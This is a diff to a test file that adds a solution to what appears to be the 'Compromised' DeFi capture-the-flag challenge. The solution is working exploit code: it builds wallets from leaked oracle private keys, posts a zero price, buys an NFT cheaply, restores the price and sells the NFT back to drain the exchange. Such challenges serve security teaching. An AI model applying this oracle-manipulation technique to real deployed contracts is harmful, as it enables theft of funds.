@@ -53,6 +53,26 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const source2Signer = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider); //bytes to utf8 to base64 decode
+        expect(source2Signer.address).to.be.equal(sources[1]);
+        const source3Signer = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider); //bytes to utf8 to base64 decode
+        expect(source3Signer.address).to.be.equal(sources[2]);
+
+        await oracle.connect(source2Signer).postPrice('DVNFT', 0);
+        await oracle.connect(source3Signer).postPrice('DVNFT', 0);
+
+        const medPrice = await oracle.getMedianPrice('DVNFT');
+        expect(medPrice).to.be.equal(0);
+
+        const tx = await exchange.connect(player).buyOne({value: 1});
+        const rc = await tx.wait();
+        const tokenId = rc.events[1].args.tokenId;
+
+        await oracle.connect(source2Signer).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(source3Signer).postPrice('DVNFT', INITIAL_NFT_PRICE);
+
+        await nftToken.connect(player).approve(exchange.address, tokenId);
+        await exchange.connect(player).sellOne(tokenId);
     });
 
     after(async function () {
